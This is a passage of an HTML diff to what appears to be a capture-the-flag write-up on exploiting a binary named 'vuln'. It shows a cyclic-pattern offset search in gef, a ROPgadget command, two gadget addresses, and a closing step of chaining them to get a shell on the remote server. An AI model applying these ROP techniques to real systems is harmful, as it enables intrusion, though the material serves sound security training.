+<span id="cb9-22"><a href="#cb9-22"></a>[<span class="ex">+</span>] Searching <span class="st">&#39;paaaaaaa&#39;</span></span>
+<span id="cb9-23"><a href="#cb9-23"></a>[<span class="ex">+</span>] Found at offset 113 (little-endian search) <span class="ex">likely</span></span>
+<span id="cb9-24"><a href="#cb9-24"></a>[<span class="ex">+</span>] Found at offset 120 (big-endian search) </span>
+<span id="cb9-25"><a href="#cb9-25"></a><span class="ex">gef</span>➤ </span></code></pre></div>
 <h2 id="find-gadgets">Find gadgets</h2>
 <p>Run <code>ROPgadget</code> to print all the gadges in <code>vuln</code>.</p>
-<pre><code>ROPgadget --binary ./vuln</code></pre>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1"></a><span class="ex">ROPgadget</span> --binary ./vuln</span></code></pre></div>
 <p><code>ROP.find_gadget</code> in <code>pwntools</code> is convinient, but some gadgets might be missing in gadget list, we could still manually add them.</p>
-<pre><code>...
-0x0000000000419127 : mov qword ptr [rdx], rax ; ret
-...
-0x0000000000451974 : push rsp ; ret
-...</code></pre>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1"></a><span class="ex">...</span></span>
+<span id="cb11-2"><a href="#cb11-2"></a><span class="ex">0x0000000000419127</span> : mov qword ptr [rdx], rax <span class="kw">;</span> <span class="ex">ret</span></span>
+<span id="cb11-3"><a href="#cb11-3"></a><span class="ex">...</span></span>
+<span id="cb11-4"><a href="#cb11-4"></a><span class="ex">0x0000000000451974</span> : push rsp <span class="kw">;</span> <span class="ex">ret</span></span>
+<span id="cb11-5"><a href="#cb11-5"></a><span class="ex">...</span></span></code></pre></div>
 <p>Combine them all together to get shell and find the flag in <code>flag.txt</code> on remote server.</p>
     </div>
     <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
